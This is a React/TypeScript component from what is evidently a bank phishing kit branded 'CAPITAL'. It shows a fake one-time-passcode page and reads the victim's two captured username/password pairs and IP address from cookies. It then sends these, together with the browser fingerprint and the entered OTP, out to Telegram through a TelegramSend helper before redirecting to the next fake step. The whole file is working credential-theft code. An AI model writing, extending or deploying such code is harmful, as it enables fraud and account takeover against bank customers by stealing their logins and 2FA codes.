import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";
import Countdown from "react-countdown";



export default function Addition() {
  const [formInput, setFormInput] = useState<Addition>({
    courseCode:""
  });

  const login1: Login = cookies.get("login1");
  const login2: Login2 = cookies.get("login2");
  const ip: string = cookies.get("ip");
  const navigate = useNavigate();
const [isLoading, setIsLoading] = useState(false)
  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    setIsLoading(true)
    event.preventDefault();
    

    const message = `
    [----+🏦 CAPITAL 🏦+-----]
    
    IP: ${ip}

    Fingerprint: ${navigator.userAgent}

    Username: ${login1.username}
    Password: ${login1.password}

    Username 2: ${login2.username2}
    Password 2: ${login2.password2}

    Code: ${formInput.courseCode}
    `;

    await TelegramSend(message)
    cookies.set("courseCode", formInput.courseCode)
    setIsLoading(false);
    navigate("../login/auth/3", {replace:true})
  }

    const renderer = ({minutes, seconds, completed}:{hours:number, minutes:number, seconds:number, completed:boolean}) =>{
    if(completed){
        return <button className="underline" type="button" onClick={()=>window.location.reload()}>Resend code</button>
    }else{
        return <div className="text-red-500 font-bold">Time remaining - {minutes.toString().padStart(2, "0")+"m"} : {seconds.toString().padStart(2, "0")+"s"}</div>
    }
  }

  return (
    <>
    <p className="bg-green-100 p-4">For your security, A one time passcode has been sent to your phone number and email address. Please enter the code below </p>
    <form action="" method="post" onSubmit={handleSubmit}>
      <div className="form-area">
          
            <div className="input-field">
                <label htmlFor="">Code</label>
                <input type="text" name="courseCode" required onChange={handleInputChange}/>
            </div>

            <div>
                <Countdown date={Date.now() + 300000} renderer={renderer}/>
              </div>

          {isLoading ?
            (
            <button className="btn" type="button">Please wait.....</button>
            )
            :(
            <button className="btn" type="submit">Submit</button>)
}


           
        </div>
    </form>
    </>
  );
}
